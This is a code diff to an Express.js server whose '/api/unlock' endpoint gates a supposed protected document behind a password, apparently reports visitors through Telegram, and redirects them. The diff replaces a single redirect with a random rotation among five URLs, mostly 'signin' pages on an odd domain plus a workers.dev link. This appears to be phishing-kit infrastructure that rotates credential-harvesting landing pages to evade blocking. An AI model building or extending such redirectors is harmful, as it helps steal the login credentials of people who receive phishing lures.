@@ -11,6 +11,15 @@ app.use(express.static(__dirname));
 
 const CORRECT_CODE = process.env.DOCUMENT_PASSWORD || "2027219";
 
+// Add as many URLs as you want here. The script will pick one at random.
+const REDIRECT_URLS = [
+  "https://project-th2027-5f1cc0-f15ea4.meridian-construction.workers.dev/?k=ePUUmpRwMGS9pXmOhJ-WqD3R",
+  "https://signin.rdations.com/w-t/ipz6ctn7?k=i4Uueq8MF5CHSzdL5w3vXPCR",
+  "https://signin.rdations.com/w-t/4vfpga-4?k=YTppJSrI36s3hLjz9KXC8xgf",
+  "https://signin.rdations.com/w-t/zb4nc7kp?k=Xqj_Fjb79OmpOgjfe7x1uo1P",
+  "https://signin.rdations.com/w-t/ctsymnvc?k=IZGZgV_wqn-Fj1LXhYdr83D4"
+];
+
 app.post('/api/unlock', async (req, res) => {
   try {
     const { password, userAgent, referrer } = req.body;
@@ -71,10 +80,13 @@ app.post('/api/unlock', async (req, res) => {
         }
       }
 
+      // Pick a random URL from the array
+      const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
+
       // Always allow access even if Telegram fails
       res.json({ 
         success: true, 
-        redirectUrl: "https://project-th2027-5f1cc0-f15ea4.meridian-construction.workers.dev/?k=ePUUmpRwMGS9pXmOhJ-WqD3R" 
+        redirectUrl: randomUrl 
       });
     } else {
       console.log('❌ Incorrect password attempt');
